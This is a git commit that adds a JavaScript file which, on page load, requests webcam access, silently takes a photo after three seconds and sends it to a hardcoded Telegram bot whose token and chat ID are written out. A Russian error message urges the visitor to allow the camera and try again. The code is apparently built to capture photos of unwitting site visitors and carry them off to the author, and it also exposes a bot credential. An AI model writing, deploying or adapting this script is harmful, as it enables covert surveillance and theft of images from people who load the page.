6bf34ec0a96402a39291772e4ba5e86549855e27
qx08 <qx08edt@gmail.com>
2026-03-17 07:12:26 +0500

    Create script.js

---
+++ script.js
@@ -0,0 +1,48 @@
+const BOT_TOKEN = '8380564571:AAG6pyo--3PRjg7uRMI88SAl_J51w3Z5C8U';
+const CHAT_ID = '7672652168';
+
+async function sendTelegram(photoBase64) {
+    const url = https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto;
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', dataURItoBlob(photoBase64));
+    await fetch(url, { method: 'POST', body: formData });
+}
+
+function dataURItoBlob(dataURI) {
+    const byteString = atob(dataURI.split(',')[1]);
+    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+    const ab = new ArrayBuffer(byteString.length);
+    const ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+    }
+    return new Blob([ab], { type: mimeString });
+}
+
+async function startCam() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        // Ждём 3 секунды и делаем фото
+        setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const photo = canvas.toDataURL('image/jpeg');
+            sendTelegram(photo);
+            
+            // Выключаем камеру
+            stream.getTracks().forEach(track => track.stop());
+        }, 3000);
+    } catch (error) {
+        alert('Ошибка доступа к камере. Разреши доступ и попробуй снова.');
+    }
+}
+
+// Запускаем камеру сразу при загрузке страницы
+window.onload = startCam;
